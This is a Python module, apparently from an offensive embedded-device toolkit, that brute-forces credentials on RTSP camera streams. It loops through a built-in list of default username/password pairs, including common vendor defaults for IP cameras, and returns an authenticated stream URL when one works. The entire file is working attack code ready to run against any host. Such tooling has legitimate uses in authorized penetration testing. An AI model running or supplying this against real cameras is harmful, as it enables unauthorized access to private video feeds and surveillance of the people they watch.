"""RTSP credential bruteforce against discovered stream paths.

Attempts common username/password combinations against RTSP streams
that returned 401 during route discovery.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
from __future__ import annotations
from dataclasses import dataclass
from embedxpl.modules.network.rtsp.rtsp_client import RTSPClient


DEFAULT_CREDENTIALS: list[tuple[str, str]] = [
    ("", ""),
    ("admin", ""),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "Admin"),
    ("root", ""),
    ("root", "root"),
    ("root", "pass"),
    ("root", "password"),
    ("root", "12345"),
    ("guest", ""),
    ("guest", "guest"),
    ("user", "user"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "admin123"),
    ("admin", "1111"),
    ("admin", "4321"),
    ("supervisor", "supervisor"),
    ("service", "service"),
    ("ubnt", "ubnt"),
    ("admin", "hikvision"),
    ("admin", "dahua"),
    ("admin", "1234567890"),
]


@dataclass
class CameraCredential:
    """Validated RTSP credential pair."""

    host: str
    port: int
    path: str
    username: str
    password: str
    rtsp_url: str


def brute_credentials(
    host: str,
    port: int,
    path: str,
    credentials: list[tuple[str, str]] | None = None,
    timeout: float = 3.0,
) -> CameraCredential | None:
    """Attempt credential pairs against an RTSP stream path.

    Args:
        host: Target RTSP server hostname or IP.
        port: RTSP port number.
        path: Stream path to authenticate against.
        credentials: List of (username, password) tuples. Defaults to DEFAULT_CREDENTIALS.
        timeout: Per-attempt socket timeout in seconds.

    Returns:
        CameraCredential if a valid pair is found, else None.
    """
    cred_list = credentials if credentials is not None else DEFAULT_CREDENTIALS

    for username, password in cred_list:
        try:
            client = RTSPClient(host, port, timeout=timeout)
            client.connect()
            client.set_credentials(username, password)
            resp = client.describe(path)
            client.disconnect()

            if resp.status_code == 200:
                if password:
                    rtsp_url = f"rtsp://{username}:{password}@{host}:{port}{path}"
                else:
                    rtsp_url = f"rtsp://{host}:{port}{path}"
                return CameraCredential(
                    host=host,
                    port=port,
                    path=path,
                    username=username,
                    password=password,
                    rtsp_url=rtsp_url,
                )
        except Exception:
            pass

    return None
